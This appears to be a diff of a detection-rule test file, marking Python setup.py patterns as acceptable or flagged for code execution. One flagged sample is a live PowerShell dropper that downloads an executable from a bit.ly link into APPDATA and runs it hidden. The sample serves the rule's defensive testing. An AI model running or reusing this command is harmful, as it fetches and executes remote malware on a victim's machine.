@@ -10,6 +10,7 @@
 
 """ OK: Executing python files to extract version information 
 """
+
 here = os.path.abspath(os.path.dirname(__file__))
 about = {}
 with open(os.path.join(here, 'pip-tool', '__version__.py'), 'r', 'utf-8') as f:
@@ -50,21 +51,23 @@ exec(open(path.join(name, 'version.py')).read())
 
 """ OK: os.system used for setup purposes
 """
-# todook: code-execution
+
+# ok: code-execution
 os.system('python setup.py sdist bdist_wheel')
-# todook: code-execution
+# ok: code-execution
 os.system('twine upload dist/*')
 
 
 """ RULEID: executing bash commands 
 """
+
 # ruleid: code-execution
 os.popen("cd %s && git init " % TEST_MODULES_ROOT)
 
 # ruleid: code-execution
 popen("cd %s && git init " % TEST_MODULES_ROOT)
 
-# todoruleid: code-execution
+# ruleid: code-execution
 os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
 
 # ruleid: code-execution
